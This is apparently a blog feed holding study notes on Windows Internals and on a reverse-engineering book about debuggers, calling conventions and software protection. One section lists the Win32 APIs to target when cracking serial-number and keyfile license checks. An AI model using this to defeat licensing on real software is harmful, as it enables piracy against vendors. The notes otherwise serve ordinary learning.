class="headerlink" title="Jobs"></a>Jobs</h3><p>Windows provides an extension to the process model called a <em>job</em>. A job object’s main function is to allow the management and manipulation of groups of processes as a unit.</p><p>A job object allows control of certain attributes and provides limits for the process or processes associated with the job.</p><h3 id="Virtual-Memory"><a href="#Virtual-Memory" class="headerlink" title="Virtual Memory"></a>Virtual Memory</h3><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/1.3.png'><img src="/images/books/WindowsInternal1/1.3.png" width="600"></p><p>Windows implements a virtual memory system based on a flat (linear) address space that provides each process with the illusion of having its own large, private address space.</p><p>Virtual memory provides a logical view of memory that might not correspond to its physical layout.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/1.4.png'><img src="/images/books/WindowsInternal1/1.4.png" width="600"></p><h3 id="Kernel-mode-vs-user-mode"><a href="#Kernel-mode-vs-user-mode" class="headerlink" title="Kernel mode vs. user mode"></a>Kernel mode vs. user mode</h3><p>To protect user applications from accessing and/or modifying critical OS data, Windows uses two processor access modes (even if the processor on which Windows is running supports more than two): <strong>user mode</strong> and <strong>kernel mode</strong>. User application code runs in user mode, whereas OS code (such as system services and device drivers) runs in kernel mode.</p><p>Kernel mode refers to a mode of execution in a processor that grants access to all system memory and all CPU instructions.</p><p>Although each Windows process has its own private memory space, the kernel-mode OS and device-driver code share a single virtual address space. Each page in virtual memory is tagged to indicate what access mode the processor must be in to read and/or write the page.</p><p>Pages in system space can be accessed only from kernel mode, whereas all pages in the user address space are accessible from user mode and kernel mode.</p><p>Windows 10 drivers must be signed by only two of the accepted certification authorities with a SHA-2 Extended Validation (EV) Hwardware certificate instead of the regular file-based SHA-1 certiicate and its 20 authorities.</p><h3 id="Hypervisor"><a href="#Hypervisor" class="headerlink" title="Hypervisor"></a>Hypervisor</h3><p>The need for fast, efficient, and secure virtualization has driven new models of computing and reasoning about software.</p><p>To provide such virtualization services, almost all modern solutions employ the use of a <strong>hypervisor</strong>, which is a specialized and highly privileged component that allows for the virtualization and isolation of all resources on the machine, from virtual to physical memory, to device interrupts, and even to PCI and USB devices.</p><p>In Windows 10, Microsoft now leverages the Hyper-V hypervisor to provide a new set of services known as <strong>virtualization-based security (VBS)</strong>:</p><ul><li><strong>Device Guard</strong>: This provides Hypervisor Code Integrity (HVCI) for stronger code-signing guaratees over KMCS alone, and allows for the custumization of the signature policy of the Windows OS, for both user-mode and kernel mode code.</li><li><strong>Hyper Guard</strong>: This protects key kernel-related and hypervisor-related data structures and code.</li><li><strong>Credential Guard</strong>: This prevents unauthorized access to domain account credentials and secrets, combined with secure biometrics.</li><li><strong>Application Guard</strong>: This provides an even stronger sandbox for the Microsoft Edge browser.</li><li><strong>Host Guardian and Shielded Fabric</strong>: These leverage a virtual TPM (v-TPM) to protect a virtual machine from the infrastructure it’s running on.</li></ul><p>Additionally, the Hyper-V hypervisor enables certain key kernel mitigations against exploits and other attackers.</p><h3 id="Firmware"><a href="#Firmware" class="headerlink" title="Firmware"></a>Firmware</h3><h3 id="Terminal-Services-and-multiple-sessions"><a href="#Terminal-Services-and-multiple-sessions" class="headerlink" title="Terminal Services and multiple sessions"></a>Terminal Services and multiple sessions</h3><p><strong>Terminal Services</strong> refers to the support in Windows for multiple interactive user sessions on a single systerm.</p><p>With Windows Terminal Services, a remote user can establish a session on another machine, log in, and run applications on the server.</p><p>The first session is considered the services session, or session zero, and contains system service hosing processes.</p><h3 id="Objects-and-handles"><a href="#Objects-and-handles" class="headerlink" title="Objects and handles"></a>Objects and handles</h3><p>In the Windows OS, a <strong>kernel object</strong> is a single, run-time instance of a statically defined object type. An <strong>object type</strong> comprises a system-defined data type, functions that operate on instances of the data type, and a set of object attributes.</p><p>The most fundamental difference between an object and an ordinary data structure is that the internal structure of an object is opaque. You must call an object service to get data out of or put data into an object. You can’t directly read or change data in side an object.</p><p>Objects, through the help of a kernel component called the <strong>object manager</strong>.</p><p>Not all data structures in the Windows OS are objects. Only data that needs to be shared, protected, named, or made visible to user-mode programs (via system services) is placed in objects. Structures used by only one component of the OS to implement internal functions are not objects.</p><h3 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h3><p>Windows has three forms of access control over objects:</p><ul><li><strong>Discretionary access control</strong>: It’s the method by which owners of objects (such as files or printers) grant or deny access to others. With Windows Server 2012 and Windows 8, this form of discretionary control is further improved by implementing attribute-based access control (also called Dynamic Access Control).</li><li><strong>Privileged access control</strong>: This is necessary for those times when discretionary access control is not enough. It’s a method of ensuring that someone can get to protected objects if the owner isn’t available.</li><li><strong>Mandatory integrity control</strong>: This is required when an additional level of security control is needed to protect objects that are being accessed from within the same user account.</li></ul><p>Starting with Windows 8, a sandbox called an <strong>AppContainer</strong> is used to host Windows Apps, which provides isolation with relation to other AppContainers and non-Windows Apps processes.</p><h3 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h3><h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><h1 id="Chapter-2-System-architecture"><a href="#Chapter-2-System-architecture" class="headerlink" title="Chapter 2 - System architecture"></a>Chapter 2 - System architecture</h1><h2 id="Operating-system-model"><a href="#Operating-system-model" class="headerlink" title="Operating system model"></a>Operating system model</h2><h2 id="Architecture-overview"><a href="#Architecture-overview" class="headerlink" title="Architecture overview"></a>Architecture overview</h2><p>Despite its pervasive use of objects to represent shared system resources, Windows is not an object-oriented system in the strict sense. Most of the kernel-mdoe OS code is written in C for portability. The C programming language doesn’t directly support object-oriented constructs such as polymorphic functions or class inheritance. Therefore, the C-based implementation of objects in Windows borrows from, but doesn’t depend on, features of particular object-oriented languages.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/2.1.png'><img src="/images/books/WindowsInternal1/2.1.png" width="600"></p><p>The boexes above the line represent user-mode processes, and the components below the line are kernel-mode OS services.</p><p>A second dividing line between kernel-mode parts of Windwos and the hypervisor is also visible. The hypervisor still runs with the same CPU privilege level (0) as the kernel, but because it uses specialized CPU instructions (VT-x on Intel, SVM on AMD), it can both isolate itself from the kernel while also monitoring it (and applications). Some people may call it <strong>ring -1</strong>, which is <strong>INACCURATE</strong>.</p><p>Four basic types of user-mode processes:</p><ul><li><strong>User processes</strong></li><li><strong>Service processes</strong></li><li><strong>System processes</strong></li><li><strong>Environment sybsystem server processes</strong></li></ul><p>Windows 10 Version 1607 includes a Windows Sybsystem for Linux (WSL) in beta state for developers only. However, this is not a true subsystem as described in this section.</p><p>Notice the Sybsystem DLLs blox below the Service Processes and User Processes boxes. Under Windows, user applications don’t call the native Windows OS services directly. Rather, they go through on or more <strong>subsystem dynamic-link libraries (DLLs)</strong>. The role of subsystem DLLs is to translate a documented function into the appropriate internal (and generally undocumented) native system service calls implemented mostly in <strong>Ntdll.dll</strong>.</p><p>The kernel-mode components of Windows include the following:</p><ul><li><strong>Executive</strong>: The Windows executive contains the base OS services, such as memory management, process and thread management, security, I/O, networking, and inter-process communication.</li><li><strong>The Windows kernel</strong></li><li><strong>Device drivers</strong>: This includes both hardware device drivers, and non-hardware device drivers.</li><li><strong>The Hardware Abstraction Layer (HAL)</strong></li><li><strong>The windowing and graphics system</strong></li><li><strong>The hypervisor layer</strong>: This is composed of the hypervisor itself. There are no drivers or other modules in this environment. The hypervisor is itself composed of multiple internal layers and services, such as its own memory manager, virtual processor scheduler, interrupt and timer management, synchronization routines, partitions, IPC and more.</li></ul><p>Core Windows System Files:</p><div class="table-container"><table><thead><tr><th>File Name</th><th>Components</th></tr></thead><tbody><tr><td>Ntoskrnl.exe</td><td>Executive and kernel</td></tr><tr><td>Hal.dll</td><td>HAL</td></tr><tr><td>Win32.sys</td><td>Kernel-mode part of the Windows subsystem (GUI)</td></tr><tr><td>Hvix64.exe (Intel), Hvax64.exe (AMD)</td><td>Hypervisor</td></tr><tr><td>.sys file in \SystemRoot\System32\Drivers</td><td>Core driver files, such as Direct X, Volume Manager, TCP/IP, TPM, andACPI supprot.</td></tr><tr><td>Ntdll.dll</td><td>Internal support functions and system service dispatch stubs to executive functions</td></tr><tr><td>Kernel32.dll, Advapi32.dll, User32.dll, Gdi32.dll</td><td>Core Windows subsystem DLLs.</td></tr></tbody></table></div><h3 id="Portability"><a href="#Portability" class="headerlink" title="Portability"></a>Portability</h3><p>Windows archives portability accross hardware architectures and platforms in two primary ways:</p><ul><li><strong>By using layered design</strong></li><li><strong>By using C</strong></li></ul><h3 id="Symmetric-multiprocessing"><a href="#Symmetric-multiprocessing" class="headerlink" title="Symmetric multiprocessing"></a>Symmetric multiprocessing</h3><p>Windows is a <strong>symmetric multiprocessing (SMP)</strong> OS. There is no master processor——the OS as well as user threads can be scheduled to run on any processor. Also, all the processors share just one memory space. This module contrasts with <strong>asymmetric multiprocessing (ASMP)</strong>, in which the OS typically selects one processor to execute OS kernel code while other processors run only user code.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/2.2.png'><img src="/images/books/WindowsInternal1/2.2.png" width="600"></p><p>Windows also supports four modern types of multiprocessor system: multicore, simultaneous multi-threaded (SMT), heterogeneous, and non-uniform memory access (NUMA).</p><h3 id="Scalability"><a href="#Scalability" class="headerlink" title="Scalability"></a>Scalability</h3><h3 id="Differences-between-client-and-server-versions"><a href="#Differences-between-client-and-server-versions" class="headerlink" title="Differences between client and server versions"></a>Differences between client and server versions</h3><h3 id="Checked-build"><a href="#Checked-build" class="headerlink" title="Checked build"></a>Checked build</h3><h2 id="Virtualization-based-security-architecture-overview"><a href="#Virtualization-based-security-architecture-overview" class="headerlink" title="Virtualization-based security architecture overview"></a>Virtualization-based security architecture overview</h2><p>The separation between user mode and kernel mode provides protection for the OS from user-mode code, whether malicious or not.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/2.3.png'><img src="/images/books/WindowsInternal1/2.3.png" width="600"></p><p>Here VBS stands for Virtualization-Based Security. VTL stands for Virtual Trust Levels.</p><p>The user/kernel code is running on top of a Hyper-V hypervisor. The difference is that with VBS enabled, a VTL of 1 is now present, which contains its own secure kernel running in the privileged processor mode (that is, ring 0 on x86/x64).</p><p>Similarly, a run-time user environment mode, called the Isolated User Mode (IUM), now exists, which runs in unprivileged mode (that is, ring 3).</p><h2 id="Key-system-components"><a href="#Key-system-components" class="headerlink" title="Key system components"></a>Key system components</h2><p>The role of an environment subsystem is to expose some subset of the base Windows executive system services to application programs.</p><p>User applications don’t call Windows system services directly. Instead, they go through one or more subsystem DLLs. These libraries export the documented interface that the programs linked to that subsystem can called.</p><h3 id="Executive"><a href="#Executive" class="headerlink" title="Executive"></a>Executive</h3><p>The executive includes the following types of functions:</p><ul><li><strong>Functions that are exported and callable from user mode</strong>: These functions are called system services and are exported via Ntdll.dll</li><li><strong>Device driver functions that are called through the DeviceIoControl function</strong></li><li><strong>Functions that can be called only from kernel mode that are exported and documented in the WDK</strong></li><li><strong>Functions that are defined as global symbols but are not exported</strong></li><li><strong>Functions that are internal to a module that are not defined as global symbols</strong></li></ul><h3 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h3><p>The kernel consists of a set of functions in <code>Ntoskrnl.exe</code> that provides fundamental mechanisms. THese include thread-scheduling and synchronization services, used by the executive components, and low-level hardware architecture——dependent support, such as interrupt and exception dispatching, which is different on each processor architecture.</p><p>The kernel provides a low-level based of well-defined, predictable OS primitives and mechanisms that allow higher-level components of the executive to do what they need to do.</p><h3 id="HAL"><a href="#HAL" class="headerlink" title="HAL"></a>HAL</h3><h3 id="Device-Drivers"><a href="#Device-Drivers" class="headerlink" title="Device Drivers"></a>Device Drivers</h3><h3 id="System-Processes"><a href="#System-Processes" class="headerlink" title="System Processes"></a>System Processes</h3><h1 id="Chapter-3-Processes-and-jobs"><a href="#Chapter-3-Processes-and-jobs" class="headerlink" title="Chapter 3 - Processes and jobs"></a>Chapter 3 - Processes and jobs</h1><ul><li>CreateProcess</li><li>CreateProcessAsUser: If a different token is required.</li><li>CreateProcessWithTokenW (advapi32.dll)</li><li>CreateProcessWithLogonW (advapi32.dll)</li><li>SlrCreateProcessWithLogon</li></ul><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/3.1.png'><img src="/images/books/WindowsInternal1/3.1.png" width="600"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    <category term="Book" scheme="https://iss4cf0ng.github.io/categories/Book/"/>
    
    
  </entry>
  
  <entry>
    <title>[Book] Encrypting and Decrypting a Software</title>
    <link href="https://iss4cf0ng.github.io/2026/01/23/2026-1-23-SoftwareCrypto/"/>
    <id>https://iss4cf0ng.github.io/2026/01/23/2026-1-23-SoftwareCrypto/</id>
    <published>2026-01-22T16:47:22.000Z</published>
    <updated>2026-01-27T07:31:37.920Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/libro.jpg'><img src="/images/books/SoftwareCrypto/libro.jpg" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Encrypting and Decrypting a Software”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><p>This book covers many topics and has almost 1,000 pages.</p><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.png'><img src="/images/meme/mika_nagisa_rollcake.png" width="300"></p><p>The book includes the following topics:</p><ul><li>Software cracking (patching and bypassing)</li><li>Mathematical cryptography (with formulas and expressions)</li><li>Software vulnerabilities (stack buffer overflow and heap buffer overflow)</li><li>Software packing, unpacking, and packer stubs</li><li>Reverse engineering</li></ul><p>Most of the topics focus on Windows rather than Linux.</p><p>Personally, I do not recommend this book for beginners in reverse engineering. Although the topics are broad, the book does not explore them in great depth. While the book introduces a wide range of topics, some of them could benefit from more detailed explanations, which may make the book less accessible to beginners.</p><p>There are several typos in the book, such as misusing the terms <em>byte</em> and <em>bit</em>, which was quite confusing.</p><p>The biggest drawback is that the example source code is very difficult to obtain for foreign readers. It would be excellent if the authors uploaded their source code to GitHub, similar to the author of <a href="https://iss4cf0ng.github.io/2026/01/04/2026-1-4-BookReverseEngineeringCore/">Reverse Engineering Core</a>.</p><p>On the other hand, since the book covers many topics, it can be used as a reference or dictionary. In addition, it includes some topics that are rarely discussed in other books.</p><h1 id="Chapter-1-Fundamental-Knowledge"><a href="#Chapter-1-Fundamental-Knowledge" class="headerlink" title="Chapter 1 - Fundamental Knowledge"></a>Chapter 1 - Fundamental Knowledge</h1><h2 id="1-3-Windows-OS"><a href="#1-3-Windows-OS" class="headerlink" title="1.3 - Windows OS"></a>1.3 - Windows OS</h2><h3 id="Win32-API"><a href="#Win32-API" class="headerlink" title="Win32 API"></a>Win32 API</h3><ul><li>Kernel (kernel32.dll): Processes, threads, memory, file IO, etc.</li><li>User (user32.dll): Mouse click, keyboard input, window, menu, etc.</li><li>GDI (gdi32.dll): Display text.</li><li>advapi32.dll</li><li>comctl32.dll</li><li>comdlg32.dll</li><li>shell32.dll</li><li>netapi32.dll</li></ul><p>For Win32 API functions, “A” stands for ANSI. “W” stands for Widechars(Unicode).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int MessageBox(<br>    HWND hWnd,<br>    LPCTSTR lpText,<br>    LPCTSTR lpCaption,<br>    UINT uType<br>);<br></code></pre></td></tr></table></figure><h3 id="WOW64"><a href="#WOW64" class="headerlink" title="WOW64"></a>WOW64</h3><p>WOW64 stands for <strong>Windows on Windows 64-bit</strong>.</p><h3 id="Windows-Message-Mechanism"><a href="#Windows-Message-Mechanism" class="headerlink" title="Windows Message Mechanism"></a>Windows Message Mechanism</h3><p><strong>SendMessage()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">LRESULT SendMessage(<br>    HWND hWnd,<br>    UINT Msg,<br>    WPARAM wParam,<br>    LPARAM lParam<br>);<br></code></pre></td></tr></table></figure></p><p><strong>WM_COMMAND</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WM_COMMAND<br>    wNotifyCode = HIWORD(wParam);<br>    wID = LOWORD(wParam);<br>    hwndCtl = (HWND)lParam;<br></code></pre></td></tr></table></figure></p><p><strong>WM_GETTEXT</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WM_GETTEXT<br>    wParam = (WPARAM)cchTextMax;<br>    lParam = (LPARAM)lpszText;<br></code></pre></td></tr></table></figure></p><p><strong>WM_QUIT</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WM_QUIT<br>    nExitCode = (int)wParam;<br></code></pre></td></tr></table></figure></p><p><strong>WM_LBUTTONDOWN</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WM_LBUTTONDOWN<br>    fwKeys = wParam;<br>    xPos = LOWORD(lParam);<br>    yPos = HIWORD(lParam);<br></code></pre></td></tr></table></figure></p><h3 id="Virtual-Memory"><a href="#Virtual-Memory" class="headerlink" title="Virtual Memory"></a>Virtual Memory</h3><h1 id="Chapter-2-Dynamic-Analysis"><a href="#Chapter-2-Dynamic-Analysis" class="headerlink" title="Chapter 2 - Dynamic Analysis"></a>Chapter 2 - Dynamic Analysis</h1><h2 id="2-1-OllyDbg"><a href="#2-1-OllyDbg" class="headerlink" title="2.1 - OllyDbg"></a>2.1 - OllyDbg</h2><h3 id="BreakPoint"><a href="#BreakPoint" class="headerlink" title="BreakPoint"></a>BreakPoint</h3><ol><li>INT 3  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">004013A5 CC D0404000<br></code></pre></td></tr></table></figure>OllyDbg replaces the original instruction to <code>0xCC</code>. However, the original instruction in displayed.</li><li><p>Hardware BreakPoint<br>Hardware break points are implemented with <code>DRx</code> registers. The addresses of break points are stored into <code>DR0</code> ~ <code>DR3</code>, while <code>DR7</code> stores the status. Thus, the maximum number of hardware break points are is 4.</p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.1.png'><img src="/images/books/SoftwareCrypto/2.1.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.2.png'><img src="/images/books/SoftwareCrypto/2.2.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.3.png'><img src="/images/books/SoftwareCrypto/2.3.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.4.png'><img src="/images/books/SoftwareCrypto/2.4.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.5.png'><img src="/images/books/SoftwareCrypto/2.5.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.6.png'><img src="/images/books/SoftwareCrypto/2.6.png" width="500"> </p></li><li><p>Memory BreakPoint</p><ol><li>On Access</li><li><p>On Write</p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.7.png'><img src="/images/books/SoftwareCrypto/2.7.png" width="500"></p></li></ol></li><li><p>Set break-on-access</p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.8.png'><img src="/images/books/SoftwareCrypto/2.8.png" width="500"> </p></li><li><p>Message BreakPoint</p><ol><li>View -&gt; Windows</li><li><p>Message breakpoint on ClassProc</p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.9.png'><img src="/images/books/SoftwareCrypto/2.9.png" width="500"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.10.png'><img src="/images/books/SoftwareCrypto/2.10.png" width="500"></p></li></ol></li><li><p>Conditional BreakPoint</p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.11.png'><img src="/images/books/SoftwareCrypto/2.11.png" width="500"> <figcaption> Shift+F2 </figcaption> </p></li><li>Conditional Log</li></ol><h2 id="2-3-MDebug"><a href="#2-3-MDebug" class="headerlink" title="2.3 - MDebug"></a>2.3 - MDebug</h2><h2 id="2-4-WinDbg"><a href="#2-4-WinDbg" class="headerlink" title="2.4 - WinDbg"></a>2.4 - WinDbg</h2><h1 id="Chapter-3-Static-Analysis"><a href="#Chapter-3-Static-Analysis" class="headerlink" title="Chapter 3 - Static Analysis"></a>Chapter 3 - Static Analysis</h1><h2 id="3-2-Disassembly-Engine"><a href="#3-2-Disassembly-Engine" class="headerlink" title="3.2 - Disassembly Engine"></a>3.2 - Disassembly Engine</h2><ol><li>ODDisasm</li><li>BeaEngine</li><li>Udis86</li><li>Capstone</li><li>AsmJit</li><li>Keystone</li></ol><h2 id="3-3-Static-Disassembly"><a href="#3-3-Static-Disassembly" class="headerlink" title="3.3 - Static Disassembly"></a>3.3 - Static Disassembly</h2><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.1.png'><img src="/images/books/SoftwareCrypto/3.1.png" width="500"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.2.png'><img src="/images/books/SoftwareCrypto/3.2.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.3.png'><img src="/images/books/SoftwareCrypto/3.3.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.4.png'><img src="/images/books/SoftwareCrypto/3.4.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.5.png'><img src="/images/books/SoftwareCrypto/3.5.png" width="700"></p><h3 id="Hexadecimal-Tools"><a href="#Hexadecimal-Tools" class="headerlink" title="Hexadecimal Tools"></a>Hexadecimal Tools</h3><ul><li>HexWorkship</li><li>WinHex</li><li>Hiew</li></ul><h1 id="Chapter-4-Reverse-Engineering-Techniques"><a href="#Chapter-4-Reverse-Engineering-Techniques" class="headerlink" title="Chapter 4 - Reverse Engineering Techniques"></a>Chapter 4 - Reverse Engineering Techniques</h1><h2 id="4-1-Reverse-Engineering-on-x32-Platform"><a href="#4-1-Reverse-Engineering-on-x32-Platform" class="headerlink" title="4.1 - Reverse Engineering on x32 Platform"></a>4.1 - Reverse Engineering on x32 Platform</h2><h3 id="Calling-Convention"><a href="#Calling-Convention" class="headerlink" title="Calling Convention"></a>Calling Convention</h3><p>Example1:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test1(p1, p2, p3);<br></code></pre></td></tr></table></figure></p><p><strong>__cdecl</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p3     ; right to left<br>push p2<br>push p1<br>call test1<br>add esp,0C  ; stack cleanup<br></code></pre></td></tr></table></figure></p><p><strong>pascal</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p1     ; left to right<br>push p2<br>push p3<br>call test1  ; stack cleanup in the function<br></code></pre></td></tr></table></figure></p><p><strong>stdcall</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p3     ; right to left<br>push p2<br>push p1<br>call test1  ; stack cleanup in the function<br></code></pre></td></tr></table></figure></p><hr><p>Example2:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test2(p1, p2);<br></code></pre></td></tr></table></figure></p><p><strong>stdcall</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p2                         ; Parameter 2<br>push p1                         ; Parameter 1<br>call test2<br>&#123;<br>    push ebp                    ; Original EBP pointer<br>    mov ebp, esp                ; New EBP pointer<br>    mov eax, dword ptr[ebp+0C]  ; Parameter 2<br>    mov ebx, dword ptr[ebp+08]  ; Parameter 1<br>    sub esp, 8                  ; Reserve space for local variables<br><br>    ...<br><br>    add esp, 8                  ; Release space of local variables<br>    pop ebp                     ; Original EBP pointer<br>    ret 8                       ; return (Equal to ret # add esp, 8)<br>                                ; 2 (Parameter) x 4h = 8<br>&#125;<br></code></pre></td></tr></table></figure></p><ul><li>enter: push ebp # mov ebp,esp # sub esp, xxx</li><li>leave: add esp, xxx # pop ebp</li></ul><p>We can rewrite the script above<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">enter xxxx, 0   ; Reserver space xxxx for local variable<br><br>...<br><br>leave<br>ret 8<br></code></pre></td></tr></table></figure></p><hr><p>Enable <strong>Maximum Speed</strong> in VC6.0<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p2<br>push p1<br>call test2<br>&#123;<br>    mov eax, dword ptr [esp+04]     ; Call parameter 1<br>    mov ecx, dword ptr [esp+08]     ; Call parameter 2<br><br>    ...<br><br>    ret 8                           ; return<br>&#125;<br></code></pre></td></tr></table></figure></p><h3 id="Virtual-Function"><a href="#Virtual-Function" class="headerlink" title="Virtual Function"></a>Virtual Function</h3><h1 id="Chapter-5-Software-Protection-Demonstration"><a href="#Chapter-5-Software-Protection-Demonstration" class="headerlink" title="Chapter 5 - Software Protection Demonstration"></a>Chapter 5 - Software Protection Demonstration</h1><h2 id="5-1-Serial-Number-and-KeyGen"><a href="#5-1-Serial-Number-and-KeyGen" class="headerlink" title="5.1 - Serial Number and KeyGen"></a>5.1 - Serial Number and KeyGen</h2><ol><li><script type="math/tex; mode=display"> \text{Serial Number} = F(\text{Username})</script></li><li><script type="math/tex; mode=display">\text{Username} = F^{-1}(\text{Serial Number})</script></li><li><script type="math/tex; mode=display"> F_1(\text{Username}) = F_2(\text{Serial Number})</script></li><li><script type="math/tex; mode=display"> Some value = F(\text{Username}, \text{Serial Number})</script></li></ol><h3 id="Exploiting-Serial-Number-Protection-Mechanism"><a href="#Exploiting-Serial-Number-Protection-Mechanism" class="headerlink" title="Exploiting Serial Number Protection Mechanism"></a>Exploiting Serial Number Protection Mechanism</h3><p>Commonly used API functions for Serial Number Protection:</p><ol><li>The following functions are commonly used for input:<ul><li>GetWindowTextA(W)</li><li>GetDlgItemTextA(W)</li><li>GetDlgItemInt</li><li>hmencpy (Windows 9x/Me only)</li></ul></li><li>The floowing functions are commonly used for messagebox:<ul><li>MessageBoxA(W)</li><li>MessageBoxExA(W)</li><li>ShowWindow</li><li>MessageBoxIndirectA(W)</li><li>CreateDialogParamA(W)</li><li>CreateDialogIndirectParamA(W)</li><li>DialogBoxParamA(W)</li><li>DialogBoxIndirectParamA(W)</li></ul></li><li>Other functions:<ol><li>Serial number might be stored in registry:<ul><li>RegQueryValueExA(W)</li></ul></li><li>Serial number might be stored in an INI file:<ul><li>GetPrivateProfileStringA(W)</li><li>GetPrivateProfileIntA(W)</li><li>GetProfileStringA(W)</li><li>GetProfileIntA(W)</li></ul></li><li>Serial number might be stored in other file:<ul><li>CreateFileA(W)</li><li>_lopen()</li></ul></li></ol></li></ol><h3 id="KeyFile-Protection"><a href="#KeyFile-Protection" class="headerlink" title="KeyFile Protection"></a>KeyFile Protection</h3><div class="table-container"><table><thead><tr><th>API Function</th><th>Description</th></tr></thead><tbody><tr><td>FindFirstFileA</td></tr><tr><td>CreateFileA, _lopen</td></tr><tr><td>GetFileSize, GetFileSizeEx</td></tr><tr><td>GetFileAttributesA, GetFileAttributesExA</td></tr><tr><td>SetFilePointer, SetFilePointerEx</td><td>Mov</td></tr><tr><td>ReadFile</td><td>Obtain file content.</td></tr></tbody></table></div><h2 id="5-7-Disk-Protection"><a 